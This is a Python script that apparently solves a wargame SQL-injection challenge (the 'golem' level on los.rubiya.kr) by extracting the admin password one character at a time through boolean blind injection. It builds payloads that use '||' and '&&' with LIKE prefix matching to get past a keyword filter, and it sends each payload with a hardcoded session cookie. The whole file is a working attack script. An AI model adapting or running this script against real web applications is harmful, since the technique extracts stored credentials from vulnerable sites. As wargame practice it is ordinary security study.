import urllib.parse
import requests


url = "https://los.rubiya.kr/chall/golem_4b5202cfedd8160e73124b5234235ef5.php"
cookie = "o390n0a72vrspg30ujnemh0bnf"
candidates = [chr(i) for i in range(48, 48+10)] + \
    [chr(i) for i in range(97, 97+26)] + \
    [chr(i) for i in range(65, 65+26)] + \
    ["_", "@", "$", "!", "?", "&", "#"]
headers = {'Cookie': 'PHPSESSID='+cookie}
print(candidates)


def attack(attack_sql):
    attack_url = url + '?pw=' + urllib.parse.quote(attack_sql)
    print(attack_url)
    res = requests.get(attack_url, headers=headers)
    # print(res.text)
    return res


def create_query(pw):
    template = "'|| id LIKE 'admin%' && pw LIKE '" + pw + "%"

    # template = "'or id='admin' and substr(pw," + \
    #     str(len(pw)) + ",1)='" + pw[-1]
    return template


def check_result(res):
    if 'Hello admin' in res.text:
        return True
    return False


correct_pass = ""
is_end = False

while True:
    for c in candidates:
        try_pass = correct_pass + str(c)
        print(try_pass)
        query = create_query(try_pass)

        res = attack(query)
        if check_result(res):
            correct_pass += c
            break
    else:
        break

print("result = ", correct_pass)
